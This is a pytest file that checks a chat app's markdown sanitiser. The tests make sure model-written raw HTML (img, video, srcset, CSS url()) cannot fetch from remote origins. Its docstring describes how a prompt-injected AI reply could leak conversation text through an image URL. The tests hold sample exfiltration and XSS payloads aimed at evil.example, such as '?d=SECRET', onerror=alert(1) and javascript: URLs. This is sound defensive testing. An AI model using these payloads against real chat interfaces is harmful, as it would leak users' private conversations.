"""Model-written raw HTML must not fetch from another origin on render.

A markdown image `![x](https://site/a.png)` renders as a click-to-load
placeholder, so a prompt-injected reply cannot leak conversation text in an
image URL. Raw HTML kept by `sanitizeAllowedHtml` (<details> blocks, <a> and
<img> tags) used to bypass that: `<img src="https://evil.example/?d=SECRET">`
was emitted as is and the browser requested it the moment the reply rendered.

The renderer runs under node with the same small parsing <template> stub as
tests/test_markdown_style_overlay_js.py (plus `replaceWith`), so the
sanitiser's per-element loop really sees the elements.
"""

import json
import re
import shutil
import subprocess
import textwrap
from pathlib import Path

import pytest

_REPO = Path(__file__).resolve().parent.parent
_HAS_NODE = shutil.which("node") is not None


@pytest.fixture(scope="module")
def node_available():
    if not _HAS_NODE:
        pytest.skip("node binary not on PATH")


_SCRIPT = textwrap.dedent(
    r"""
    import fs from 'node:fs';

    // Minimal parsing <template>: elements with attributes, removeAttribute,
    // remove, replaceWith(fragment), and serialisation through innerHTML.
    const VOID = new Set(['img', 'br', 'hr', 'input', 'meta', 'link', 'source', 'track', 'wbr']);
    const decode = (v) => v
      .replace(/&quot;/g, '"').replace(/&#39;/g, "'")
      .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
    const encode = (v) => String(v).replace(/&/g, '&amp;').replace(/"/g, '&quot;');
    function parse(html) {
      const root = { children: [] };
      const stack = [root];
      const re = /<\/([a-zA-Z][\w-]*)\s*>|<([a-zA-Z][\w-]*)((?:\s+[^\s=\/>]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*\/?>|([^<]+|<)/g;
      let m;
      while ((m = re.exec(html)) !== null) {
        const top = stack[stack.length - 1];
        if (m[1]) {
          const tag = m[1].toLowerCase();
          for (let i = stack.length - 1; i > 0; i--) {
            if (stack[i].tag === tag) { stack.length = i; break; }
          }
        } else if (m[2]) {
          const tag = m[2].toLowerCase();
          const attributes = [];
          const are = /([^\s=\/>]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g;
          let a;
          while ((a = are.exec(m[3] || '')) !== null) {
            const raw = a[2] ?? a[3] ?? a[4] ?? '';
            attributes.push({ name: a[1].toLowerCase(), value: decode(raw) });
          }
          const el = {
            tag, tagName: tag.toUpperCase(), attributes, children: [], parent: top,
            removeAttribute(n) {
              const i = this.attributes.findIndex(x => x.name === n.toLowerCase());
              if (i >= 0) this.attributes.splice(i, 1);
            },
            remove() {
              const i = this.parent.children.indexOf(this);
              if (i >= 0) this.parent.children.splice(i, 1);
            },
            replaceWith(node) {
              const kids = node._fragmentRoot ? node._fragmentRoot().children : [node];
              for (const k of kids) k.parent = this.parent;
              const i = this.parent.children.indexOf(this);
              if (i >= 0) this.parent.children.splice(i, 1, ...kids);
            },
          };
          top.children.push(el);
          if (!VOID.has(tag)) stack.push(el);
        } else {
          top.children.push({ text: m[4] });
        }
      }
      return root;
    }
    function serialize(node) {
      return node.children.map(c => {
        if (c.text !== undefined) return c.text;
        const attrs = c.attributes.map(a => ` ${a.name}="${encode(a.value)}"`).join('');
        if (VOID.has(c.tag)) return `<${c.tag}${attrs}>`;
        return `<${c.tag}${attrs}>${serialize(c)}</${c.tag}>`;
      }).join('');
    }
    function all(node, out = []) {
      for (const c of node.children) if (c.tag) { out.push(c); all(c, out); }
      return out;
    }

    globalThis.window = { location: { origin: 'http://localhost' }, katex: null };
    globalThis.document = {
      readyState: 'loading',
      addEventListener() {},
      createElement(tag) {
        if (tag !== 'template') throw new Error(`unsupported element: ${tag}`);
        const tpl = { _root: { children: [] } };
        tpl.content = {
          querySelectorAll: () => all(tpl._root),
          _fragmentRoot: () => tpl._root,
        };
        Object.defineProperty(tpl, 'innerHTML', {
          set(v) { tpl._root = parse(String(v)); },
          get() { return serialize(tpl._root); },
        });
        return tpl;
      },
    };
    globalThis.MutationObserver = class { observe() {} };

    let source = fs.readFileSync('./static/js/markdown.js', 'utf8');
    source = source.replace(/import uiModule from ['"]\.\/ui\.js(?:[?#][^'"]*)?['"];?/, '');
    source = source.replace(
      /import \{ splitTableRow \} from ['"]\.\/markdown\/tableRow\.js['"];/,
      `function splitTableRow(row) {
        return (row || '').replace(/^\\s*\\|/, '').replace(/\\|\\s*$/, '').split('|').map(c => c.trim());
      }`
    );
    const emojiSource = fs.readFileSync('./static/js/emojiShortcodes.js', 'utf8')
      .replace(/^export default .*$/m, '')
      .replace(/export const /g, 'const ')
      .replace(/export function /g, 'function ');
    source = source.replace(
      /import \{ replaceEmojiShortcodes, hasEmojiShortcode \} from ['"]\.\/emojiShortcodes\.js['"];/,
      () => emojiSource
    );
    source = source.replace(
      /var escapeHtml = uiModule\.esc;/,
      `var escapeHtml = (value) => String(value ?? '')
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');`
    );

    const mod = await import('data:text/javascript;base64,' + Buffer.from(source).toString('base64'));
    const inputs = JSON.parse(process.argv[1]);
    console.log(JSON.stringify(inputs.map(input => mod.mdToHtml(input))));
    """
)


def _render_all(markdowns):
    result = subprocess.run(
        ["node", "--input-type=module", "-e", _SCRIPT, json.dumps(markdowns)],
        cwd=_REPO, capture_output=True, text=True, timeout=15,
    )
    if result.returncode != 0:
        raise AssertionError(f"node failed:\nSTDERR:\n{result.stderr}\nSTDOUT:\n{result.stdout}")
    return json.loads(result.stdout.splitlines()[-1])


_PLACEHOLDER = 'class="chat-image chat-image-remote"'
_LEAK_URL = "https://evil.example/raw-img?d=SECRET"
_FETCHING_SRC = re.compile(r'(?<![\w-])src="https://evil\.example')


def _details(inner):
    return f"Note <details><summary>more</summary>{inner}</details> end"


def test_raw_remote_img_becomes_click_to_load_placeholder(node_available):
    raw, markdown = _render_all([
        f'Hi <img src="{_LEAK_URL}">',
        f"Hi ![]({_LEAK_URL})",
    ])
    # The markdown-image form is the reference: it renders the placeholder.
    assert _PLACEHOLDER in markdown, markdown
    assert f'data-chat-image-src="{_LEAK_URL}"' in markdown, markdown
    # The raw <img> must render the same placeholder, never a fetching <img>.
    # (`data-chat-image-src` is the placeholder's inert data, not a fetch.)
    assert not _FETCHING_SRC.search(raw), raw
    assert "<img" not in raw, raw
    assert _PLACEHOLDER in raw, raw
    assert f'data-chat-image-src="{_LEAK_URL}"' in raw, raw


def test_raw_remote_img_keeps_alt(node_available):
    (html,) = _render_all([f'Hi <img alt="Chart" src="{_LEAK_URL}">'])
    assert _PLACEHOLDER in html, html
    assert 'data-chat-image-alt="Chart"' in html, html
    assert "<img" not in html, html


def test_srcset_is_always_removed(node_available):
    img, source = _render_all([
        'Hi <img src="/api/files/x.png" srcset="https://evil.example/x.png 2x">',
        _details('<picture><source srcset="https://evil.example/s.png 1x"></picture>'),
    ])
    for html in (img, source):
        assert "srcset" not in html, html
        assert "evil.example" not in html, html
    assert '<img src="/api/files/x.png">' in img, img


_MEDIA = [
    '<video poster="https://evil.example/p.png" src="https://evil.example/v.mp4"></video>',
    '<audio src="https://evil.example/a.mp3"></audio>',
    '<video><source src="https://evil.example/s.mp4"><track src="https://evil.example/t.vtt"></video>',
    '<input type="image" src="https://evil.example/i.png">',
    '<table background="https://evil.example/b.png"><tr><td>c</td></tr></table>',
    '<area href="https://evil.example/area">',
]


def test_remote_fetch_attributes_on_other_tags_are_removed(node_available):
    outputs = _render_all([_details(m) for m in _MEDIA])
    for markup, html in zip(_MEDIA, outputs):
        # The element itself survives (only the fetching attribute goes).
        tag = re.match(r"<(\w+)", markup).group(1)
        assert f"<{tag}" in html, (markup, html)
        assert "evil.example" not in html, (markup, html)


# Quoted URLs, so the bare-URL autolink pass (which runs before raw HTML is
# extracted) leaves the style intact and the sanitiser sees it as written.
_FETCHING_STYLES = [
    "background:url('https://evil.example/x')",
    "background-image: URL ('https://evil.example/x')",
    "list-style:image-set('https://evil.example/x' 1x)",
    "content:src('https://evil.example/x')",
]

# Unquoted, as a model would often write them. The autolink pass mangles
# these into `url(<a href=...` before sanitising; the style must still go.
_FETCHING_STYLES_UNQUOTED = [
    "background:url(https://evil.example/x)",
    "background-image: URL (https://evil.example/x)",
]


def test_styles_that_fetch_are_removed(node_available):
    outputs = _render_all([
        _details(f'<div style="{style}">x</div>') for style in _FETCHING_STYLES
    ])
    for style, html in zip(_FETCHING_STYLES, outputs):
        assert "style=" not in html, (style, html)
        assert "evil.example" not in html, (style, html)
        assert "<div>x</div>" in html, (style, html)


def test_unquoted_fetching_styles_are_removed(node_available):
    outputs = _render_all([
        _details(f'<div style="{style}">x</div>') for style in _FETCHING_STYLES_UNQUOTED
    ])
    for style, html in zip(_FETCHING_STYLES_UNQUOTED, outputs):
        assert "style=" not in html, (style, html)
        assert not re.search(r"(?i)url\s*\(", html), (style, html)


def test_same_origin_and_click_only_content_is_kept(node_available):
    img, link, styled, media = _render_all([
        'Hi <img src="/api/files/x.png">',
        'Visit <a href="https://example.org">site</a> now',
        _details('<div style="color:red">x</div>'),
        _details('<video src="/api/files/v.mp4" poster="/api/files/p.png"></video>'),
    ])
    assert '<img src="/api/files/x.png">' in img, img
    assert _PLACEHOLDER not in img, img
    assert '<a href="https://example.org">site</a>' in link, link
    assert '<div style="color:red">x</div>' in styled, styled
    assert '<video src="/api/files/v.mp4" poster="/api/files/p.png"></video>' in media, media


# --- Document-editor opt-out -------------------------------------------------
# The document editor (static/js/document.js) loads saved rich-text documents
# and email bodies through sanitizeAllowedHtml. Users insert remote images
# there, so its load paths pass { keepRemoteMedia: true }: the three
# remote-fetch rules above are skipped and the images round-trip, while every
# older protection still applies. The default stays strict.

_SANITIZE_SCRIPT = _SCRIPT.replace(
    "console.log(JSON.stringify(inputs.map(input => mod.mdToHtml(input))));",
    "console.log(JSON.stringify(inputs.map(([html, opts]) =>"
    " opts === null ? mod.sanitizeAllowedHtml(html) : mod.sanitizeAllowedHtml(html, opts))));",
)
assert _SANITIZE_SCRIPT != _SCRIPT

_KEEP = {"keepRemoteMedia": True}


def _sanitize_all(pairs):
    result = subprocess.run(
        ["node", "--input-type=module", "-e", _SANITIZE_SCRIPT, json.dumps(pairs)],
        cwd=_REPO, capture_output=True, text=True, timeout=15,
    )
    if result.returncode != 0:
        raise AssertionError(f"node failed:\nSTDERR:\n{result.stderr}\nSTDOUT:\n{result.stdout}")
    return json.loads(result.stdout.splitlines()[-1])


def test_editor_opt_out_keeps_remote_media(node_available):
    img, video, styled = _sanitize_all([
        ['<img src="https://example.org/a.png" alt="x">', _KEEP],
        ['<video poster="https://example.org/p.png"></video>', _KEEP],
        ['<div style="background:url(\'https://example.org/b.png\')">x</div>', _KEEP],
    ])
    assert '<img src="https://example.org/a.png" alt="x">' in img, img
    assert _PLACEHOLDER not in img, img
    assert '<video poster="https://example.org/p.png"></video>' in video, video
    assert "style=" in styled and "example.org/b.png" in styled, styled


def test_editor_opt_out_keeps_older_protections(node_available):
    handler, overlay, script, js_src = _sanitize_all([
        ['<img src="x" onerror="alert(1)">', _KEEP],
        ['<a style="position:fixed;inset:0">x</a>', _KEEP],
        ['a<script>alert(1)</script>b', _KEEP],
        ['<img src="javascript:alert(1)">', _KEEP],
    ])
    assert "onerror" not in handler, handler
    assert "<img" in handler, handler
    assert "style" not in overlay, overlay
    assert "<script" not in script and "alert" not in script, script
    assert "javascript:" not in js_src, js_src


def test_default_and_falsy_option_stay_strict(node_available):
    outputs = _sanitize_all([
        ['<img src="https://example.org/a.png" alt="x">', None],
        ['<img src="https://example.org/a.png" alt="x">', {}],
        ['<img src="https://example.org/a.png" alt="x">', {"keepRemoteMedia": "yes"}],
    ])
    for html in outputs:
        assert _PLACEHOLDER in html, html
        assert "<img" not in html, html


# Every sanitizeAllowedHtml call in the editor opts out except the paste
# cleaner: the four load paths plus the rich preview and the DOCX preview.
_EDITOR_LOAD_FUNCS = (
    "_sanitizedRichTextHtml",
    "_richTextContentToHtml",
    "_emailBodyFragmentToHtml",
    "_emailBodyToHtml",
    "_setMarkdownPreviewActive",
    "_setDocxPreviewActive",
)


def test_document_editor_call_sites_pass_the_opt_out():
    from tests.helpers.document_source import document_source, function_body

    for name in _EDITOR_LOAD_FUNCS:
        calls = re.findall(r"sanitizeAllowedHtml\(([^)]*)\)", function_body(name))
        assert calls, name
        for args in calls:
            assert re.search(r",\s*\{\s*keepRemoteMedia:\s*true\s*\}", args), (name, args)
    paste = re.findall(r"sanitizeAllowedHtml\(([^;]*?)\)\s*\n", function_body("_cleanRichTextPasteHtml"))
    assert paste, "paste cleaner call not found"
    assert all("keepRemoteMedia" not in args for args in paste), paste
    # Exactly the six calls above opt out, nothing else in the editor.
    assert document_source().count("keepRemoteMedia") == 6


# The paste cleaner stays strict, so a pasted remote <img> comes back from the
# sanitiser as the placeholder link. The cleaner drops pasted images; it must
# drop that placeholder too, or its "Remote image blocked" text is written
# into the user's document.
def test_paste_cleaner_drops_the_remote_image_placeholder(node_available):
    from tests.helpers.document_source import function_body

    (html,) = _sanitize_all([
        ['<p><img src="https://cdn.example.org/photo.jpg" alt="Team photo"></p>', None],
    ])
    # What the cleaner receives: an <a> carrying the placeholder class.
    assert '<a class="chat-image chat-image-remote"' in html, html

    body = function_body("_cleanRichTextPasteHtml")
    drop = "querySelectorAll('a.chat-image-remote').forEach(el => el.remove())"
    assert drop in body, "paste cleaner keeps the remote-image placeholder"
    # It runs after sanitising and before the tag allowlist unwraps nodes.
    assert body.index("sanitizeAllowedHtml") < body.index(drop) < body.index("allowedTags.has(el.tagName)")
